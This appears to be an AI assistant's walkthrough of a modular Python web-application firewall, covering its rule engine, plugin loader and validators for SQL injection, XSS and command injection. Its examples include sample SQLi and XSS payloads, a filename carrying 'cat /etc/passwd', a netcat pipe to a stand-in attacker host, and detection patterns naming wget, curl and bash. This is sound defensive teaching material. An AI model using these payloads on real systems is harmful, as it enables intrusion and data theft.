...
I'll provide a detailed explanation of the modular WAAP architecture and how all the components work together.

## Architecture Overview

The modular WAAP system follows a **plugin-based architecture** where each security rule and validator is a separate, independent module that can be updated without affecting others.[^3_1][^3_2]

```
┌─────────────────────────────────────────────────────────────┐
│                    WAAP Security Module                      │
│  ┌───────────────────────────────────────────────────────┐  │
...
### 1. **Base Rule Engine** (`base_rule_engine.py`)

This is the **foundation** of the entire system. Think of it as the contract that all rules must follow.
...
**Purpose**: Acts as a **data container** that carries all information about an incoming API request to the rules for evaluation.

**Why it's important**: All rules receive the same standardized context, making it easy to add new rules that access any request component.[^3_2]
...
**Purpose**: Every security rule **must inherit** from this class and implement the `evaluate()` method.

**How it works**:

1. Each rule receives a `RuleContext` with request data
2. The rule examines the data for violations
3. Returns a list of `RuleMatch` objects (empty if safe, populated if attack detected)

**Example Flow**:

```python
# Request comes in with suspicious data
context = RuleContext(
    body={"username": "admin' OR '1'='1"}
)

# SQLi rule evaluates it
sql_rule = SQLInjectionRule()
matches = sql_rule.evaluate(context)  # Returns [RuleMatch(...)]

# If matches found, it means attack detected!
```
...
```python
class RuleEngine:
    def evaluate_all(self, context: RuleContext):
        for rule in self.rules.values():
...
**Purpose**: The **orchestrator** that runs all registered rules and makes the final block/allow decision.

**Anomaly Scoring System**:[^3_3][^3_4]

- Each rule has a severity (1-5)
- Matches add to total score
- If total score ≥ threshold → **BLOCK**
- Example: SQLi match (5 points) + XSS match (4 points) = 9 points → BLOCK if threshold is 5

**Why this approach**:

- More flexible than binary yes/no
- Multiple small violations can trigger block
- One critical violation immediately blocks

***

### 2. **Rule Loader** (`rule_loader.py`)

This is the **magic** that enables modularity - it automatically discovers and loads all rule files.
...
def discover_rules(self) -> List[Type[BaseRule]]:
    ...
    # Scan all .py files in rules/ directory
    for file_path in rules_path.glob("*.py"):
        module = importlib.import_module(module_name)
        
        # Find classes that inherit from BaseRule
        for name, obj in inspect.getmembers(module):
...
1. Scans the `rules/` directory
2. Imports each Python file as a module
3. Uses **reflection** to find classes inheriting from `BaseRule`
4. Automatically instantiates and registers them

**Why this is powerful**:

- **Just drop a new rule file in `rules/` folder** → automatically loaded!
- No need to manually register rules
- Hot-reload capability for updates without restart

**Example**:

```
rules/
├── api01_bola.py          ← Automatically discovered
├── api02_authentication.py ← Automatically discovered
└── my_custom_rule.py       ← You add this → Auto-loaded!
```


***

### 3. **SQL Injection Validator** (`sql_injection.py`)

This demonstrates how to create an **extensible pattern-based validator**.

#### **Paranoia Level System**:[^3_5]

```python
# Level 1: High confidence (few false positives)
self.level1_patterns = [
    (r"(?i)\bunion\b.{1,100}\bselect\b", "SQL: UNION SELECT"),
    (r"(?i)'\s*or\s*'1'\s*=\s*'1", "SQL: OR '1'='1"),
]
...
# Compile only patterns for current paranoia level
if self.paranoia_level >= 1:
    self.patterns.extend(self.level1_patterns)
if self.paranoia_level >= 2:
    self.patterns.extend(self.level2_patterns)
...
**Purpose**: Balance between security and usability.

**How it works**:

- **Level 1**: Only catches obvious attacks (high precision)
- **Level 2**: Catches more attacks but may have false positives
- **Level 3-4**: Very aggressive (use in high-security environments)

**Example Attack Detection**:

```python
validator = SQLInjectionValidator(paranoia_level=2)
...
# Output:
# is_valid = False
# msg = "Potential SQL injection detected: SQL: OR '1'='1"
# pattern = "' OR '1'='1"
```
...
```python
def validate(self, data: Any, field_name: str = ""):
    if isinstance(data, str):
        return self._check_string(data, field_name)
...
**Why recursive**: API requests have nested structures like:

```json
{
  "user": {
    "profile": {
      "bio": "malicious' OR '1'='1"  ← Validates this too!
    }
  }
}
```
...
**Use case**: You discover a new SQLi technique → add pattern without modifying core code:

```python
validator.add_custom_pattern(
    r"(?i)waitfor\s+delay", 
    "SQL: Time-based blind SQLi"
)
```
...
### 4. **XSS Detection Validator** (`xss_detection.py`)

Similar structure to SQLi validator but focuses on Cross-Site Scripting patterns.

#### **HTML Entity Decoding**:

```python
def _check_string(self, text: str, field_name: str):
    decoded = html.unescape(text)
...
**Why check both**: Attackers use encoding to bypass filters:[^3_6]

```
Original:  &lt;script&gt;alert('XSS')&lt;/script&gt;
Decoded:   <script>alert('XSS')</script>  ← Catches this!
```
...
### 5. **Command Injection Validator** (`command_injection.py`)

Prevents OS command execution attacks.
...
# Common dangerous commands
(r"(?i)\b(cat|ls|wget|curl|bash)\b", "CMD: Common Unix command"),
```
...
| nc attacker.com    # Pipe to netcat
```

**Real API scenario**:

```python
# API endpoint: /api/files/download?filename=report.pdf
# Attacker tries:
filename = "report.pdf; cat /etc/passwd"

# Validator catches the ";" separator and blocks request
```


***

### 6. **Input Validation Rule** (`api03_property_authorization.py`)

This shows how **validators integrate with rules**.
...
class InputValidationRule(BaseRule):
    def __init__(self):
        super().__init__(rule_id="API03-001", ...)
        
        # Rule contains multiple validators
        self.validators = {
            'sql_injection': SQLInjectionValidator(),
            'xss': XSSDetectionValidator(),
            'command_injection': CommandInjectionValidator()
        }
    ...
    def evaluate(self, context: RuleContext):
        ...
        # Run all validators
        for validator_name, validator in self.validators.items():
            is_valid, msg, pattern = validator.validate(context.body)
...
1. Rule receives request context
2. Passes data through each validator (SQLi, XSS, CMD)
3. Each validator returns whether data is safe
4. Rule aggregates results into `RuleMatch` objects
5. Engine collects all matches and calculates score
...
# InputValidationRule evaluates
rule = InputValidationRule()
matches = rule.evaluate(context)

# XSS validator detects attack
# Returns: [RuleMatch(rule_id="API03-001-xss", score=4, ...)]
```
...
class MassAssignmentProtectionRule(BaseRule):
    def __init__(self):
        self.protected_fields = [
            'id', 'is_admin', 'role', 'password_hash'
        ]
...
# Attack attempt:
{"username": "john", "is_admin": true}  # ✗ BLOCKED!
...
### 7. **WAAP Security Module** (`waap_security.py`)

The **main coordinator** that brings everything together.
...
1. Creates rule engine with scoring threshold
2. Creates rule loader
3. Automatically discovers and loads:
    - All validators from `validators/` folder
    - All rules from `rules/` folder

#### **Request Evaluation**:

```python
def evaluate_request(self, **kwargs):
    # 1. Build context from request components
    context = RuleContext(
    ...
    # 2. Pass to engine for evaluation
    return self.engine.evaluate_all(context)
```
...
Score ≥ Threshold?
    ↓
Return: (block=True/False, matches, score)
```
...
Let's trace a malicious request through the entire system:

```python
# 1. Initialize WAAP
waap = WAAPSecurityModule(anomaly_threshold=5)
# ↓ Auto-loads: SQLi validator, XSS validator, InputValidationRule, etc.

# 2. Malicious request arrives
malicious_request = {
    "method": "POST",
    "endpoint": "/api/users",
    "body": {
        "username": "admin' OR '1'='1",  # SQLi attempt
        "bio": "<script>alert('XSS')</script>"  # XSS attempt
    }
}

# 3. Evaluate request
should_block, matches, score = waap.evaluate_request(**malicious_request)

# 4. What happens internally:

# Step 4a: RuleContext created
context = RuleContext(
    method="POST",
    endpoint="/api/users",
    body={"username": "admin' OR '1'='1", "bio": "<script>..."}
)

# Step 4b: InputValidationRule evaluates
rule = InputValidationRule()
rule_matches = rule.evaluate(context)

# Step 4c: SQLi validator checks username field
sqli_validator = rule.validators['sql_injection']
is_valid, msg, pattern = sqli_validator.validate("admin' OR '1'='1")
# Returns: (False, "Potential SQL injection", "' OR '1'='1")
# Creates RuleMatch with score=5

# Step 4d: XSS validator checks bio field
xss_validator = rule.validators['xss']
is_valid, msg, pattern = xss_validator.validate("<script>alert('XSS')</script>")
# Returns: (False, "Potential XSS attack", "<script>...")
# Creates RuleMatch with score=4

# Step 4e: Engine calculates total
# total_score = 5 (SQLi) + 4 (XSS) = 9
# threshold = 5
# 9 >= 5 → should_block = True

# 5. Result
print(should_block)  # True
print(score)         # 9
print(matches)       # [RuleMatch(SQLi), RuleMatch(XSS)]
```
...
### **1. Modularity**[^3_1][^3_2]

Each vulnerability type is in its own file:

```
validators/
├── sql_injection.py      ← Update SQLi patterns here
├── xss_detection.py      ← Update XSS patterns here
└── ldap_injection.py     ← Add new validator here
```

**Benefit**: Update one without touching others.

### **2. Extensibility**

Add new rule by creating one file:

```python
# rules/api11_custom_rule.py
from ..core.base_rule_engine import BaseRule

class MyCustomRule(BaseRule):
    def __init__(self):
        super().__init__(rule_id="API11-001", ...)
...
**That's it!** The rule loader automatically discovers and loads it.

### **3. Pattern Updates**

Add new attack patterns without code changes:

```python
# Runtime pattern addition
waap.engine.validators['sql_injection'].add_custom_pattern(
    r"(?i)benchmark\s*\(", 
    "SQL: Benchmark timing attack"
)
```
...
Easily tune sensitivity:

```python
# Low paranoia (production with high traffic)
SQLInjectionValidator(paranoia_level=1)

# High paranoia (high security environment)
SQLInjectionValidator(paranoia_level=4)
```


### **5. Scoring Flexibility**

Adjust thresholds per environment:

```python
# Development: Lenient
WAAPSecurityModule(anomaly_threshold=10)

# Production: Strict
WAAPSecurityModule(anomaly_threshold=3)
```
...
1. **Plugin-based**: Rules self-register via auto-discovery
2. **Separation of concerns**: Validators handle pattern matching, rules handle business logic
3. **Composability**: Rules combine multiple validators
4. **Scoring system**: Multiple weak signals or one strong signal triggers block
5. **Extensibility**: Add new rules/validators by dropping files in folders
6. **Hot-reload**: Update patterns without restart

This design mirrors industry-standard WAF architectures like OWASP ModSecurity Core Rule Set, making it production-ready and maintainable .

<div align="center">⁂</div>

[^3_1]: https://owasp.org/www-project-modsecurity-core-rule-set/

[^3_2]: https://www.radware.com/cyberpedia/application-security/waf-architecture/

[^3_3]: http://arxiv.org/pdf/2406.13547.pdf

[^3_4]: http://arxiv.org/pdf/2308.04964.pdf

[^3_5]: https://www.netnea.com/cms/apache-tutorial-7_including-modsecurity-core-rules/

[^3_6]: https://papers.ssrn.com/sol3/Delivery.cfm/de573061-7335-4eab-a80d-266517517446-MECA.pdf?abstractid=5263014\&mirid=1
